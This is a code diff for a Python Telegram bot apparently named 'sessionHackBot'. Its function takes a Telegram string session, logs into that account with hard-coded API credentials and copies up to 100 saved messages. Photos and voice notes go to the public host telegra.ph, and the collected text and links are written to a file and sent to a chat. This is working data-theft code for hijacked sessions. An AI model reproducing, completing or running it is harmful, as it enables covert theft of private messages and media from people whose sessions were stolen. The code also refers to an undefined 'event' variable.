@@ -29,44 +29,47 @@ Bot_Username = Config.TG_BOT_USERNAME or "sessionHackBot"
 import os
 from telegraph import Telegraph
 from telethon.tl import types
-async def savedmsgs(bot, strses):
+async def savedmsgs(strses):
     async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
         try:
             telegraph = Telegraph()
             telegraph.create_account(short_name="MyTelegraphAccount", author_name="Anonymous") 
             
             messages = []
-
             async for msg in X.iter_messages('me', reverse=True, limit=100):
-                try:
-                    if msg.text:
-                        messages.append(f"الرساله: {msg.text}")
-                    elif msg.media:
-                        if isinstance(msg.media, types.MessageMediaPhoto):
-                            downloaded_file_name = await msg.download_media()
+                if msg.text:
+                    messages.append(f"الرساله: {msg.text}")
+                elif msg.media:
+                    if isinstance(msg.media, types.MessageMediaPhoto):
+                        try:
+                            downloaded_file_name = await X.download_media(msg.media.photo)
                             with open(downloaded_file_name, 'rb') as f:
                                 photo_url = telegraph.upload_file(f)[0]['src']  
                             messages.append(f"صورة: https://telegra.ph{photo_url}")
-                            os.remove(downloaded_file_name)
-                        elif isinstance(msg.media, types.MessageMediaDocument):
-                            if hasattr(msg.media.document, 'mime_type') and 'audio' in msg.media.document.mime_type:
-                                downloaded_file_name = await msg.download_media()
+                            os.remove(downloaded_file_name)  
+                        except ValueError as e:
+                            print(f"Ignoring invalid photo: {e}")
+                            continue  # Skip to the next iteration of the loop
+                    elif isinstance(msg.media, types.MessageMediaDocument):
+                        if hasattr(msg.media.document, 'mime_type') and 'audio' in msg.media.document.mime_type:
+                            try:
+                                downloaded_file_name = await X.download_media(msg.media.document)
                                 with open(downloaded_file_name, 'rb') as f:
                                     voice_url = telegraph.upload_file(f)[0]['src']  
                                 messages.append(f"بصمة: {voice_url}")
                                 os.remove(downloaded_file_name)
-                except ValueError as e:
-                    print(f"Ignoring invalid media: {e}")
-                    continue  # Skip to the next iteration of the loop
+                            except ValueError as e:
+                                print(f"Ignoring invalid audio file: {e}")
+                                continue  # Skip to the next iteration of the loop
 
             with open('saved_messages.txt', 'w', encoding='utf-8') as file:
                 for message in messages:
                     file.write(message + '\n')
 
-            # Sending the file
-            await bot.send_file(event.chat_id, "saved_messages.txt")
-            os.remove("saved_messages.txt")  # Deleting the file
-            return "Saved messages have been sent as a file and the file has been deleted."
+            # Send the file to the user
+            await X.send_file(event.chat_id, 'saved_messages.txt', caption="Here are your saved messages.")
+                    
+            return "Messages saved to file 'saved_messages.txt' and sent to you as a file."
         except Exception as e:
             print(e)
             return "An error occurred while fetching saved messages."
